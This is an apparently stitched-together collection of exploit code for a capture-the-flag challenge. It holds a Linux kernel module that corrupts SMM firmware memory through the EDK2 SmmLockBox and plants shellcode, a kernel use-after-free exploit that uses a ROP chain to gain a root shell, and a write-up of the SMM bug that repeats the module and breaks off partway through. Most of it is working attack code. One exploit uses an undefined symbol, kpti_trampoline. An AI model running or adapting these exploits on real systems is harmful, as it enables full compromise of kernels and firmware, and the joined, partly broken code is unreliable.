// SPDX-License-Identifier: GPL-2.0
#include <linux/init.h>
#include <linux/module.h>
#include <asm/msr.h>
#include <asm/io.h>
#include <linux/kernel.h>
#include <linux/mm.h>
#include <linux/pgtable.h>
#include <linux/slab.h>
#include <linux/acpi.h>
#include <linux/dma-mapping.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("xia0o0o0o");
MODULE_DESCRIPTION("PWN");

typedef struct
{
    uint32_t Data1;
    uint16_t Data2;
    uint16_t Data3;
    uint8_t Data4[8];
} EFI_GUID;

#define EFI_SMM_LOCK_BOX_COMMUNICATION_GUID \
    {0x2a3cfebd, 0x27e8, 0x4d0a, {0x8b, 0x79, 0xd6, 0x88, 0xc2, 0xa3, 0xe1, 0xc0}}

EFI_GUID gEfiSmmLockBoxCommunicationGuid = EFI_SMM_LOCK_BOX_COMMUNICATION_GUID;

typedef uint64_t UINTN;
typedef uint8_t UINT8;
typedef uint32_t UINT32;
typedef uint64_t UINT64;
typedef uint64_t PHYSICAL_ADDRESS;
typedef EFI_GUID GUID;

#include <linux/types.h>

typedef struct
{
    ///
    /// Allows for disambiguation of the message format.
    ///
    EFI_GUID HeaderGuid;
    ///
    /// Describes the size of Data (in bytes) and does not include the size of the header.
    ///
    UINTN MessageLength;
    ///
    /// Designates an array of bytes that is MessageLength in size.
    ///
    UINT8 Data[1];
} EFI_MM_COMMUNICATE_HEADER;

#define EFI_SMM_LOCK_BOX_COMMAND_SAVE                  0x1
#define EFI_SMM_LOCK_BOX_COMMAND_UPDATE                0x2
#define EFI_SMM_LOCK_BOX_COMMAND_RESTORE               0x3
#define EFI_SMM_LOCK_BOX_COMMAND_SET_ATTRIBUTES        0x4
#define EFI_SMM_LOCK_BOX_COMMAND_RESTORE_ALL_IN_PLACE  0x5
#define  BIT0   0x00000001
#define  BIT1   0x00000002
//
// With this flag, this LockBox can be restored to this Buffer
// with RestoreAllLockBoxInPlace()
//
#define LOCK_BOX_ATTRIBUTE_RESTORE_IN_PLACE  BIT0
//
// With this flag, this LockBox can be restored in S3 resume only.
// This LockBox can not be restored after SmmReadyToLock in normal boot
// and after EndOfS3Resume in S3 resume.
// It can not be set together with LOCK_BOX_ATTRIBUTE_RESTORE_IN_PLACE.
//
#define LOCK_BOX_ATTRIBUTE_RESTORE_IN_S3_ONLY  BIT1

typedef struct
{
    UINT32 Command;
    UINT32 DataLength;
    UINT64 ReturnStatus;
} EFI_SMM_LOCK_BOX_PARAMETER_HEADER;

typedef struct
{
    EFI_SMM_LOCK_BOX_PARAMETER_HEADER Header;
    GUID Guid;
    PHYSICAL_ADDRESS Buffer;
    UINT64 Length;
} EFI_SMM_LOCK_BOX_PARAMETER_SAVE;

typedef struct
{
    EFI_SMM_LOCK_BOX_PARAMETER_HEADER Header;
    GUID Guid;
    UINT64 Offset;
    PHYSICAL_ADDRESS Buffer;
    UINT64 Length;
} EFI_SMM_LOCK_BOX_PARAMETER_UPDATE;

typedef struct
{
    EFI_SMM_LOCK_BOX_PARAMETER_HEADER Header;
    GUID Guid;
    PHYSICAL_ADDRESS Buffer;
    UINT64 Length;
} EFI_SMM_LOCK_BOX_PARAMETER_RESTORE;

typedef struct
{
    EFI_SMM_LOCK_BOX_PARAMETER_HEADER Header;
    GUID Guid;
    UINT64 Attributes;
} EFI_SMM_LOCK_BOX_PARAMETER_SET_ATTRIBUTES;

typedef struct
{
    EFI_SMM_LOCK_BOX_PARAMETER_HEADER Header;
} EFI_SMM_LOCK_BOX_PARAMETER_RESTORE_ALL_IN_PLACE;

// SMM_CORE_PRIVATE_DATA  *gSmmCorePrivate;
#if 0
typedef struct {
  UINTN                   Signature;

  ///
  /// The ImageHandle passed into the entry point of the SMM IPL.  This ImageHandle
  /// is used by the SMM Core to fill in the ParentImageHandle field of the Loaded
  /// Image Protocol for each SMM Driver that is dispatched by the SMM Core.
  ///
  EFI_HANDLE              SmmIplImageHandle;

  ///
  /// The number of SMRAM ranges passed from the SMM IPL to the SMM Core.  The SMM
  /// Core uses these ranges of SMRAM to initialize the SMM Core memory manager.
  ///
  UINTN                   SmramRangeCount;

  ///
  /// A table of SMRAM ranges passed from the SMM IPL to the SMM Core.  The SMM
  /// Core uses these ranges of SMRAM to initialize the SMM Core memory manager.
  ///
  EFI_SMRAM_DESCRIPTOR    *SmramRanges;

  ///
  /// The SMM Foundation Entry Point.  The SMM Core fills in this field when the
  /// SMM Core is initialized.  The SMM IPL is responsible for registering this entry
  /// point with the SMM Configuration Protocol.  The SMM Configuration Protocol may
  /// not be available at the time the SMM IPL and SMM Core are started, so the SMM IPL
  /// sets up a protocol notification on the SMM Configuration Protocol and registers
  /// the SMM Foundation Entry Point as soon as the SMM Configuration Protocol is
  /// available.
  ///
  EFI_SMM_ENTRY_POINT      SmmEntryPoint;

  ///
  /// Boolean flag set to TRUE while an SMI is being processed by the SMM Core.
  ///
  BOOLEAN                  SmmEntryPointRegistered;

  ///
  /// Boolean flag set to TRUE while an SMI is being processed by the SMM Core.
  ///
  BOOLEAN                  InSmm;

  ///
  /// This field is set by the SMM Core then the SMM Core is initialized.  This field is
  /// used by the SMM Base 2 Protocol and SMM Communication Protocol implementations in
  /// the SMM IPL.
  ///
  EFI_SMM_SYSTEM_TABLE2    *Smst;

  ///
  /// This field is used by the SMM Communication Protocol to pass a buffer into
  /// a software SMI handler and for the software SMI handler to pass a buffer back to
  /// the caller of the SMM Communication Protocol.
  ///
  VOID                     *CommunicationBuffer;

  ///
  /// This field is used by the SMM Communication Protocol to pass the size of a buffer,
  /// in bytes, into a software SMI handler and for the software SMI handler to pass the
  /// size, in bytes, of a buffer back to the caller of the SMM Communication Protocol.
  ///
  UINTN                    BufferSize;

  ///
  /// This field is used by the SMM Communication Protocol to pass the return status from
  /// a software SMI handler back to the caller of the SMM Communication Protocol.
  ///
  EFI_STATUS               ReturnStatus;

  EFI_PHYSICAL_ADDRESS     PiSmmCoreImageBase;
  UINT64                   PiSmmCoreImageSize;
  EFI_PHYSICAL_ADDRESS     PiSmmCoreEntryPoint;
} SMM_CORE_PRIVATE_DATA;
#endif

#define SMMC_PHYS_ADDR 0xeacd160
#define COMMAND_BUFFER_PHYS_ADDR 0xeb68000
void *comm_virt = NULL, *payload_virt, *smmc = NULL;
void *reserved = NULL;

void trigger_smi(void);
void send_smi(void *data, uint64_t size);
void test_smi(void);

void save_lockbox(GUID guid, PHYSICAL_ADDRESS buffer, UINT64 length) {
    EFI_SMM_LOCK_BOX_PARAMETER_SAVE save = {
        .Header = {
            .Command = EFI_SMM_LOCK_BOX_COMMAND_SAVE,
            .DataLength = sizeof(EFI_SMM_LOCK_BOX_PARAMETER_SAVE),
            .ReturnStatus = 0
        },
        .Buffer = buffer,
        .Length = length
    };
    memcpy(&save.Guid, &guid, sizeof(GUID));
    send_smi(&save, sizeof(save));
}

void set_lockbox_attributes(GUID guid, UINT64 attributes) {
    EFI_SMM_LOCK_BOX_PARAMETER_SET_ATTRIBUTES set_attributes = {
        .Header = {
            .Command = EFI_SMM_LOCK_BOX_COMMAND_SET_ATTRIBUTES,
            .DataLength = sizeof(EFI_SMM_LOCK_BOX_PARAMETER_SET_ATTRIBUTES),
            .ReturnStatus = 0
        },
        .Attributes = attributes
    };
    memcpy(&set_attributes.Guid, &guid, sizeof(GUID));
    send_smi(&set_attributes, sizeof(set_attributes));
}

void update_lockbox(GUID guid, UINT64 buffer, UINTN offset, UINTN length) {
    EFI_SMM_LOCK_BOX_PARAMETER_UPDATE update = {
        .Header = {
            .Command = EFI_SMM_LOCK_BOX_COMMAND_UPDATE,
            .DataLength = sizeof(EFI_SMM_LOCK_BOX_PARAMETER_UPDATE),
            .ReturnStatus = 0
        },
        .Buffer = buffer,
        .Offset = offset,
        .Length = length
    };
    memcpy(&update.Guid, &guid, sizeof(GUID));
    send_smi(&update, sizeof(update));
}

void restore_lockbox(GUID guid, PHYSICAL_ADDRESS buffer, UINT64 length) {
    EFI_SMM_LOCK_BOX_PARAMETER_RESTORE restore = {
        .Header = {
            .Command = EFI_SMM_LOCK_BOX_COMMAND_RESTORE,
            .DataLength = sizeof(EFI_SMM_LOCK_BOX_PARAMETER_RESTORE),
            .ReturnStatus = 0
        },
        .Buffer = buffer,
        .Length = length
    };
    memcpy(&restore.Guid, &guid, sizeof(GUID));
    send_smi(&restore, sizeof(restore));
}

void restore_all_lockbox_in_place(void) {
    EFI_SMM_LOCK_BOX_PARAMETER_RESTORE_ALL_IN_PLACE restore_all = {
        .Header = {
            .Command = EFI_SMM_LOCK_BOX_COMMAND_RESTORE_ALL_IN_PLACE,
            .DataLength = sizeof(EFI_SMM_LOCK_BOX_PARAMETER_RESTORE_ALL_IN_PLACE),
            .ReturnStatus = 0
        }
    };
    send_smi(&restore_all, sizeof(restore_all));
}

static int __init pwn_init(void) {
    pr_info("[*] pwn: module loaded\n");
    reserved = ioremap(SMMC_PHYS_ADDR & (~0xfffull), 2 * PAGE_SIZE);
    if (!reserved) {
        pr_err("pwn: failed to ioremap reserved memory\n");
        return -ENOMEM;
    }
    smmc = reserved + (SMMC_PHYS_ADDR & 0xfff);
    comm_virt = ioremap(COMMAND_BUFFER_PHYS_ADDR & (~0xfffull), PAGE_SIZE);
    if (!comm_virt) {
        pr_err("[-] pwn: failed to ioremap command buffer\n");
        return -ENOMEM;
    }
    pr_info("[+] pwn: smmc at 0x%llx, comm_virt at 0x%llx\n", smmc, comm_virt);
#if 0
    test_smi();
#endif
    EFI_GUID guid;
    memset(&guid, 0x11, sizeof(EFI_GUID));
    pr_info("[*] create a lockbox\n");
    save_lockbox(guid, 0xf000000-1, 1);
    pr_info("[*] set lockbox attributes\n");
    set_lockbox_attributes(guid, LOCK_BOX_ATTRIBUTE_RESTORE_IN_S3_ONLY);
    void *buffer = comm_virt + 0x800;
    memset(buffer, 0x60, 0x400);
    *(uint64_t *)(buffer + 1) = 0x34365f33534d4d53;
    *(uint64_t *)(buffer + 0x1 + 0x8) = 0xffc7673;
    *(uint64_t *)(buffer + 0x1 + 0x10) = SMMC_PHYS_ADDR + 0x1000 - 0x8000;
    pr_info("[*] update lockbox\n");
    update_lockbox(guid, (UINT64)COMMAND_BUFFER_PHYS_ADDR+0x800, 0, 0x1 + 0x8 + 0x8 + 0x8);
    pr_info("[*] set attributes back to restore in place\n");
    set_lockbox_attributes(guid, 0);
    set_lockbox_attributes(guid, LOCK_BOX_ATTRIBUTE_RESTORE_IN_PLACE);
    pr_info("[*] restore lockbox\n");
    restore_all_lockbox_in_place();
    {
        void *addr_ret_addr = reserved + 0x1000 - 0x28 + 0x160;
        *(uint64_t *)addr_ret_addr = 0x41414141;
    }
    {
        void *addr_ret_addr = reserved + 0x1000 - 0x28 + 0x168;
        *(uint64_t *)addr_ret_addr = 0x000000000eace150;
        uint64_t *code_start = (uint64_t *)(reserved + 0x1000 - 0x28 + 0x168 + 2 * 8);
        code_start[0] = 0x44440067b84850;
        code_start[1] = 0x25048948800000;
        code_start[2] = 0x48b48b8480ff952;
        code_start[3] = 0x489484444000025;
        code_start[4] = 0x48b8480ffdc74325;
        code_start[5] = 0x4844440008251c8b;
        code_start[6] = 0x480ffdc74b250489;
        code_start[7] = 0x440010250c8b48b8;
        code_start[8] = 0xfdc7532504894844;
        code_start[9] = 0x1825148b48b8480f;
        code_start[10] = 0x5b25048948444400;
        code_start[11] = 0x48b4cb8480ffdc7;
        code_start[12] = 0x489484444002025;
        code_start[13] = 0x4cb8480ffdc76325;
        code_start[14] = 0x4844440028250c8b;
        code_start[15] = 0x480ffdc76b250489;
        code_start[16] = 0x44003025148b4cb8;
        code_start[17] = 0xfdc7732504894844;
        code_start[18] = 0xfdc77b2504c7480f;
        code_start[19] = 0x4c65800000b0f0f;
        code_start[20] = 0xc748000ffe017825;
        code_start[21] = 0xeace1502504;
        code_start[22] = 0xc74818ec83480000;
        code_start[23] = 0xc30ffc0a2a2404;
    }
    return 0;
}

void test_smi() {
    EFI_SMM_LOCK_BOX_PARAMETER_SAVE save = {
        .Header = {
            .Command = 0x41414141, // Example command
            .DataLength = sizeof(EFI_SMM_LOCK_BOX_PARAMETER_SAVE) - sizeof(EFI_SMM_LOCK_BOX_PARAMETER_HEADER),
            .ReturnStatus = 0
        },
        .Buffer = (PHYSICAL_ADDRESS)comm_virt,
        .Length = 0xdeadbeef // Example length
    };
    send_smi(&save, sizeof(save));
    pr_info("[*] pwn: SMI triggered with test data\n");
}

void send_smi(void *data, uint64_t size) {
    void *comm = smmc + 56;
    void *comm_size = smmc + 64;
    uint64_t total_size = size + sizeof(EFI_GUID) + sizeof(UINTN);

    memcpy(comm_virt, &gEfiSmmLockBoxCommunicationGuid, sizeof(EFI_GUID));
    memcpy(comm_virt + sizeof(EFI_GUID), &size, sizeof(UINTN));
    memcpy(comm_virt + sizeof(EFI_GUID) + sizeof(UINTN), data, size);
    writeq(COMMAND_BUFFER_PHYS_ADDR, comm);
    writeq(total_size, comm_size);
    trigger_smi();
}

static void __exit pwn_exit(void) {
    pr_info("pwn: module unloaded\n");
}

void trigger_smi(void) {
    asm volatile(
        ".intel_syntax noprefix;"
        "xor eax, eax;"
        "out 0xb3, eax;"
        "out 0xb2, eax;"
        ".att_syntax;" ::: "rax");
}
module_init(pwn_init);
module_exit(pwn_exit);

------

#define _GNU_SOURCE
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/msg.h>
#include <sys/socket.h>  
#include <sys/types.h>
#include <unistd.h>
#include <sys/ipc.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <stdint.h>
#include <signal.h>
#include <sys/wait.h>
#include <sys/mman.h>

#define K1_TYPE 0xB9
#define ALLOC _IOW(K1_TYPE, 0, size_t)
#define FREE _IO(K1_TYPE, 1)
#define USE_READ _IOR(K1_TYPE, 2, char)
#define USE_WRITE _IOW(K1_TYPE, 2, char)

typedef uint64_t u64;


#define PUSH_RSI_JMP_RSI_44     0xd4ad2a   
#define POP_RSP_RET             0xeadf45   // pop rsp; ret
#define ADD_RSP_0x48_RET	 0xea7e12
#define POP_RDI                 0xeaf204   // pop rdi; ret
#define COMMIT_CREDS            0xb9970   // commit_creds function
#define INIT_CRED               0x1a52fc0   // init_cred symbol
#define SWAPGS 		 0x100180c
#define IRETQ			 0x1001ce6

u64 user_cs, user_ss, user_rflags, user_sp;

int pipes[1000][2];
int trigger_pipes[20][2];  // Pipes for triggering ROP

void save_state() {
    __asm__("movq %%cs, %0" : "=r" (user_cs));
    __asm__("movq %%ss, %0" : "=r" (user_ss));
    __asm__("pushfq; popq %0" : "=r" (user_rflags));
    __asm__("movq %%rsp, %0" : "=r" (user_sp));
}

void get_shell() {
    printf("[+] Got root shell!\n");
    system("/bin/sh");
    exit(0);
}

int spray_pipe_buffers(int count, size_t write_size) {
    char *data = malloc(write_size);
    memset(data, 'A', write_size);
    
    for (int i = 0; i < count; i++) {
        if (pipe(pipes[i]) == -1) {
            perror("pipe");
            return -1;
        }
        
        if (write(pipes[i][1], data, write_size) != write_size) {
            perror("write to pipe");
            return -1;
        }
    }
    
    free(data);
    return 0;
}

int create_trigger_pipes() {
    for (int i = 0; i < 20; i++) {
        if (pipe(trigger_pipes[i]) == -1) {
            perror("pipe for trigger");
            return -1;
        }
        
        // Write some data to allocate pipe_buffer
        char data[0x1000];
        memset(data, 'T', sizeof(data));
        if (write(trigger_pipes[i][1], data, sizeof(data)) != sizeof(data)) {
            perror("write to trigger pipe");
            return -1;
        }
    }
    return 0;
}

void close_trigger_pipes() {
    printf("[+] Closing trigger pipes to execute ROP chain...\n");
    for (int i = 0; i < 20; i++) {
        close(trigger_pipes[i][0]);
        close(trigger_pipes[i][1]);
    }
}

void hexdump(const char *data, size_t len) {
    for (size_t i = 0; i < len; i++) {
        if (i % 16 == 0) printf("%04zx: ", i);
        printf("%02x ", (unsigned char)data[i]);
        if (i % 16 == 15) {
            printf(" |");
            for (size_t j = i - 15; j <= i; j++) {
                char c = data[j];
                printf("%c", (c >= 32 && c <= 126) ? c : '.');
            }
            printf("|\n");
        }
    }
    if (len % 16 != 0) {
        for (size_t i = len % 16; i < 16; i++) printf("   ");
        printf(" |");
        for (size_t i = (len / 16) * 16; i < len; i++) {
            char c = data[i];
            printf("%c", (c >= 32 && c <= 126) ? c : '.');
        }
        printf("|\n");
    }
}

u64 extract_address(const char *data, size_t offset) {
    if (offset + 8 > 0x800) return 0;
    return *(u64 *)(data + offset);
}

int main(void) {
    printf("[+] Starting UAF exploit with kernel ROP\n");
    

    save_state();
    signal(SIGSEGV, get_shell);
    
    int fd = open("/dev/vuln", O_RDWR);
    if (fd < 0) {
        perror("open /dev/vuln");
        return -1;
    }
    

    size_t size = 1024;
    printf("[+] Allocating buffer of size %zu\n", size);
    if (ioctl(fd, ALLOC, &size) < 0) {
        perror("ALLOC");
        return -1;
    }
    

    char write_data[100];
    strcpy(write_data, "Hello from userspace!");
    
    printf("[+] Writing data to buffer\n");
    if (ioctl(fd, USE_WRITE, write_data) < 0) {
        perror("USE_WRITE");
        return -1;
    }
    char read_data[2048];
    memset(read_data, 0, sizeof(read_data));
    
    printf("[+] Reading data back\n");
    if (ioctl(fd, USE_READ, read_data) < 0) {
        perror("USE_READ");
        return -1;
    }
    
    
    
    printf("[+] Read back: %s\n", read_data);
    
    printf("[+] Freeing buffer (creating UAF)\n");
    if (ioctl(fd, FREE) < 0) {
        perror("FREE");
        return -1;
    }
    
    memset(read_data, 0, sizeof(read_data));
    printf("[+] Attempting to read freed memory (UAF)\n");
    if (ioctl(fd, USE_READ, read_data) < 0) {
        perror("USE_READ after free");
        return -1;
    }
    hexdump(read_data, 2048);
    u64 buffer_leak = extract_address(read_data, 0x200);
    printf("[!] Obscured null ptr: 0x%016llx\n", buffer_leak); 
    
    u64 my_buffer = buffer_leak - 0x400;
    printf("[+] Creating trigger pipes\n");
    if (create_trigger_pipes() < 0) {
        return -1;
    }
    
    memset(read_data, 0, sizeof(read_data));
    printf("[+] Reading memory after pipe spray\n");
    if (ioctl(fd, USE_READ, read_data) < 0) {
        perror("USE_READ after pipe spray");
        return -1;
    }
    
    u64 kernel_leak = extract_address(read_data, 0x10);
    u64 kernel_base = kernel_leak - 0x121ec40;
    printf("[!] Kernel leak: 0x%016llx\n", kernel_leak);
    printf("[!] Kernel base: 0x%016llx\n", kernel_base);
    

    printf("[+] Building JOP->ROP chain...\n");
    
   
    u64 fake_pipe_buffer_addr = my_buffer; 
    
    u64 jop_gadget = kernel_base + PUSH_RSI_JMP_RSI_44;
    u64 pop_rsp_ret = kernel_base + POP_RSP_RET;
    u64 pop_rdi = kernel_base + POP_RDI;
    u64 commit_creds = kernel_base + COMMIT_CREDS;
    u64 init_cred = kernel_base + INIT_CRED;
   
    
    printf("[+] JOP gadget: 0x%llx\n", jop_gadget);
    printf("[+] Stack pivot: 0x%llx\n", pop_rsp_ret);
    printf("[+] Commit creds: 0x%llx\n", commit_creds);
    printf("[+] KPTI trampoline: 0x%llx\n", kpti_trampoline);
    
    
    char rop_payload[1024];
    memset(rop_payload, 0, sizeof(rop_payload));
    
    *(u64 *)(rop_payload + 0x10) = fake_pipe_buffer_addr + 0x100; 
    *(u64 *)(rop_payload + 0x100 + 0x08) = jop_gadget; 
    *(u64 *)(rop_payload + 0x44) = pop_rsp_ret;
    *(u64 *)(rop_payload + 0x00) = kernel_base + ADD_RSP_0x48_RET; 
    u64 *rop = (u64 *)(rop_payload + 0x48 + 8);
    
    *rop++ = pop_rdi;               // pop rdi; ret
    *rop++ = init_cred;             // init_cred address  
    *rop++ = commit_creds;          // commit_creds(init_cred)
    *rop++ = kernel_base + SWAPGS;       // return to userspace
    *rop++ = kernel_base + IRETQ;
     
    *rop++ = (u64)get_shell;        // user rip
    *rop++ = user_cs;               // user cs
    *rop++ = user_rflags;           // user rflags
    *rop++ = user_sp;               // user rsp
    *rop++ = user_ss;               // user ss
    
    // Write ROP payload to freed memory
    printf("[+] Writing ROP payload to freed memory\n");
    if (ioctl(fd, USE_WRITE, rop_payload) < 0) {
        perror("USE_WRITE ROP payload");
        return -1;
    }
    
    printf("[+] ROP chain written, press Enter to trigger...\n");
    getchar();
    
    // Trigger ROP chain by closing pipes
    close_trigger_pipes();
    
    printf("[+] If you see this, the exploit failed\n");
    close(fd);
    return 0;
}
-----

Challenge Analysis
Besides those memory access restrictions patches, we have two interesting patches, one unlocks the SmmLockBox that makes us possible to interact with it in the OS. The other one enable system wakeup via serial input.

The input to the SmmLockBoxâ€™s various functions can be untrusted and need to be sanitized. There are a lot of critical operations, for example, copying based on user input

  CopyMem ((VOID *)((UINTN)LockBox->SmramBuffer + Offset), Buffer, Length);

and there are many SmmIsBufferOutsideSmmValid calls to make sure inputs are valid, i.e., not in SMRAM or overflow.

  if (!SmmIsBufferOutsideSmmValid ((UINTN)TempLockBoxParameterUpdate.Buffer, (UINTN)TempLockBoxParameterUpdate.Length)) {
    DEBUG ((DEBUG_ERROR, "SmmLockBox Update address in SMRAM or buffer overflow!\n"));
    LockBoxParameterUpdate->Header.ReturnStatus = (UINT64)EFI_ACCESS_DENIED;
    return;
  }

Initial Memory Corruption
There is an interesting size inconsistency of SMM_LOCK_BOX_DATA::Buffer and SMM_LOCK_BOX_DATA::SmramBuffer when updating the lockbox

      if (EFI_PAGES_TO_SIZE (EFI_SIZE_TO_PAGES ((UINTN)LockBox->Length)) < Offset + Length) {
        //
        // In SaveLockBox(), the SMRAM buffer allocated for LockBox is of page
        // granularity. Here, if the required size is larger than the origin size
        // of the pages, allocate new buffer from SMRAM to enlarge the LockBox.
        //
        DEBUG ((
          DEBUG_INFO,
          "SmmLockBoxSmmLib UpdateLockBox - Allocate new buffer to enlarge.\n"
          ));
        Status = gMmst->MmAllocatePages (
                          AllocateAnyPages,
                          EfiRuntimeServicesData,
                          EFI_SIZE_TO_PAGES (Offset + Length),
                          &SmramBuffer
                          );
        if (EFI_ERROR (Status)) {
          DEBUG ((DEBUG_INFO, "SmmLockBoxSmmLib UpdateLockBox - Exit (%r)\n", EFI_OUT_OF_RESOURCES));
          return EFI_OUT_OF_RESOURCES;
        }
 
        //
        // Copy origin data to the new SMRAM buffer and wipe the content in the
        // origin SMRAM buffer.
        //
        CopyMem ((VOID *)(UINTN)SmramBuffer, (VOID *)(UINTN)LockBox->SmramBuffer, (UINTN)LockBox->Length);
        ZeroMem ((VOID *)(UINTN)LockBox->SmramBuffer, (UINTN)LockBox->Length);
        gMmst->MmFreePages (LockBox->SmramBuffer, EFI_SIZE_TO_PAGES ((UINTN)LockBox->Length));
 
        LockBox->SmramBuffer = SmramBuffer;
      }
 
      //
      // Handle uninitialized content in the LockBox.
      //
      if (Offset > LockBox->Length) {
        ZeroMem (
          (VOID *)((UINTN)LockBox->SmramBuffer + (UINTN)LockBox->Length),
          Offset - (UINTN)LockBox->Length
          );
      }
 
      LockBox->Length = Offset + Length;

The SMM_LOCK_BOX_DATA::SmramBuffer is resized and the SMM_LOCK_BOX_DATA::Length is updated as well. However, the SMM_LOCK_BOX_DATA::Buffer is not resized, which means that the size of SMM_LOCK_BOX_DATA::Buffer can be smaller than SMM_LOCK_BOX_DATA::Length and SMM_LOCK_BOX_DATA::SmramBuffer.

And when restore the lockbox in-place:

CopyMem ((VOID *)(UINTN)LockBox->Buffer, (VOID *)(UINTN)LockBox->SmramBuffer, (UINTN)LockBox->Length);

This provides us a with very great buffer overflow. Although all inputs are sanitized.

Exploit
All user provided inputs are sanitized by SmmIsBufferOutsideSmmValid, so we need to find a way to bypass it. It guarantees that the input buffer is not in SMRAM and wonâ€™t overflow into it. However, with the vulnerability above, we can provide a buffer outside SMRAM, letâ€™s say, 0xf0000000-1 with length 0x1 which is totally valid. Then trigger the buffer overflow to overwrite SmmS3ResumeState that is located at the CpuStart.

typedef struct {
  UINT64                Signature;
  EFI_PHYSICAL_ADDRESS  SmmS3ResumeEntryPoint;
  EFI_PHYSICAL_ADDRESS  SmmS3StackBase;
  UINT64                SmmS3StackSize;
  UINT64                SmmS3Cr0;
  UINT64                SmmS3Cr3;
  UINT64                SmmS3Cr4;
  UINT16                ReturnCs;
  EFI_PHYSICAL_ADDRESS  ReturnEntryPoint;
  EFI_PHYSICAL_ADDRESS  ReturnContext1;
  EFI_PHYSICAL_ADDRESS  ReturnContext2;
  EFI_PHYSICAL_ADDRESS  ReturnStackPointer;
  EFI_PHYSICAL_ADDRESS  Smst;
} SMM_S3_RESUME_STATE;

This structure is responsible for recovery from S3 sleep. Take a look at the structure, there is a very great candidate to overwrite, SmmS3ResumeEntryPoint, which is the entry point of SMM S3 resume. Also, the resuming process will restore the stack as well, which is also under our control.

      SwitchStack (
        (SWITCH_STACK_ENTRY_POINT)(UINTN)SmmS3ResumeState->SmmS3ResumeEntryPoint,
        (VOID *)AcpiS3Context,
        0,
        (VOID *)(UINTN)(SmmS3ResumeState->SmmS3StackBase + SmmS3ResumeState->SmmS3StackSize)
        );

Finally, we can craft a small ROP gadget on the stack and jump to our shellcode, then overwrite the handlers of SmmLockBox to execute our shellcode.

Bypass the memory access restrictions
As we can execute almost any code we want, we can just overwrite the corresponding PTE. If cr3 == 0000000000FF83000, the PTE for 0x44440000 will be at 0xff95200.

mov rax, 0x8000000044440067
mov qword ptr [0x000000000ff95200], rax
Then we can make it accessible.

To safely resume the system, I choose to return back to the original resume routine, SmmRestoreCpu after overwriting the lockbox handlers. The generated code will look like this:

push rax

mov rax, 0x8000000044440067
mov qword ptr [0x000000000ff95200], rax

mov rax, 4919056693616479048
mov qword ptr [0xffdc743], rax

mov rax, 4919056727977790280
mov qword ptr [0xffdc743+8], rax

mov rax, 4919056762336480072
mov qword ptr [0xffdc743+16], rax

mov rax, 4919056796696742728
mov qword ptr [0xffdc743+24], rax

mov rax, 4919056831055432524
mov qword ptr [0xffdc743+32], rax

mov rax, 4919056865415695180
mov qword ptr [0xffdc743+0x28], rax

mov rax, 4919056899775957836
mov qword ptr [0xffdc743+0x30], rax

mov qword ptr [0xffdc743+56], 0xb0f

pop rax
mov byte ptr [0xffe0178], 0
mov qword ptr [0x000000000eace150], 0
sub rsp, 0x18
mov qword ptr [rsp], 0x000000000ffc0a2a
ret
Full Exploit Code
#include <linux/init.h>
#include <linux/module.h>
#include <asm/msr.h>
#include <asm/io.h>
#include <linux/kernel.h>
#include <linux/mm.h>
#include <linux/pgtable.h>
#include <linux/slab.h>
#include <linux/acpi.h>
#include <linux/dma-mapping.h>
 
MODULE_LICENSE("GPL");
MODULE_AUTHOR("xia0o0o0o");
MODULE_DESCRIPTION("PWN");
 
typedef struct
{
    uint32_t Data1;
    uint16_t Data2;
    uint16_t Data3;
    uint8_t Data4[8];
} EFI_GUID;
 
#define EFI_SMM_LOCK_BOX_COMMUNICATION_GUID \
    {0x2a3cfebd, 0x27e8, 0x4d0a, {0x8b, 0x79, 0xd6, 0x88, 0xc2, 0xa3, 0xe1, 0xc0}}
 
EFI_GUID gEfiSmmLockBoxCommunicationGuid = EFI_SMM_LOCK_BOX_COMMUNICATION_GUID;
 
typedef uint64_t UINTN;
typedef uint8_t UINT8;
typedef uint32_t UINT32;
typedef uint64_t UINT64;
typedef uint64_t PHYSICAL_ADDRESS;
typedef EFI_GUID GUID;
 
#include <linux/types.h>
 
typedef struct
{
    ///
    /// Allows for disambiguation of the message format.
    ///
    EFI_GUID HeaderGuid;
    ///
    /// Describes the size of Data (in bytes) and does not include the size of the header.
    ///
    UINTN MessageLength;
    ///
    /// Designates an array of bytes that is MessageLength in size.
    ///
    UINT8 Data[1];
} EFI_MM_COMMUNICATE_HEADER;
 
#define EFI_SMM_LOCK_BOX_COMMAND_SAVE                  0x1
#define EFI_SMM_LOCK_BOX_COMMAND_UPDATE                0x2
#define EFI_SMM_LOCK_BOX_COMMAND_RESTORE               0x3
#define EFI_SMM_LOCK_BOX_COMMAND_SET_ATTRIBUTES        0x4
#define EFI_SMM_LOCK_BOX_COMMAND_RESTORE_ALL_IN_PLACE  0x5
#define  BIT0   0x00000001
#define  BIT1   0x00000002
//
// With this flag, this LockBox can be restored to this Buffer
// with RestoreAllLockBoxInPlace()
//
#define LOCK_BOX_ATTRIBUTE_RESTORE_IN_PLACE  BIT0
//
// With this flag, this LockBox can be restored in S3 resume only.
// This LockBox can not be restored after SmmReadyToLock in normal boot
// and after EndOfS3Resume in S3 resume.
// It can not be set together with LOCK_BOX_ATTRIBUTE_RESTORE_IN_PLACE.
//
#define LOCK_BOX_ATTRIBUTE_RESTORE_IN_S3_ONLY  BIT1
 
typedef struct
{
    UINT32 Command;
    UINT32 DataLength;
    UINT64 ReturnStatus;
} EFI_SMM_LOCK_BOX_PARAMETER_HEADER;
 
typedef struct
{
    EFI_SMM_LOCK_BOX_PARAMETER_HEADER Header;
    GUID Guid;
    PHYSICAL_ADDRESS Buffer;
    UINT64 Length;
} EFI_SMM_LOCK_BOX_PARAMETER_SAVE;
 
typedef struct
{
    EFI_SMM_LOCK_BOX_PARAMETER_HEADER Header;
    GUID Guid;
    UINT64 Offset;
    PHYSICAL_ADDRESS Buffer;
    UINT64 Length;
} EFI_SMM_LOCK_BOX_PARAMETER_UPDATE;
 
typedef struct
{
    EFI_SMM_LOCK_BOX_PARAMETER_HEADER Header;
    GUID Guid;
    PHYSICAL_ADDRESS Buffer;
    UINT64 Length;
} EFI_SMM_LOCK_BOX_PARAMETER_RESTORE;
 
typedef struct
{
    EFI_SMM_LOCK_BOX_PARAMETER_HEADER Header;
    GUID Guid;
    UINT64 Attributes;
} EFI_SMM_LOCK_BOX_PARAMETER_SET_ATTRIBUTES;
 
typedef struct
{
    EFI_SMM_LOCK_BOX_PARAMETER_HEADER Header;
} EFI_SMM_LOCK_BOX_PARAMETER_RESTORE_ALL_IN_PLACE;
 
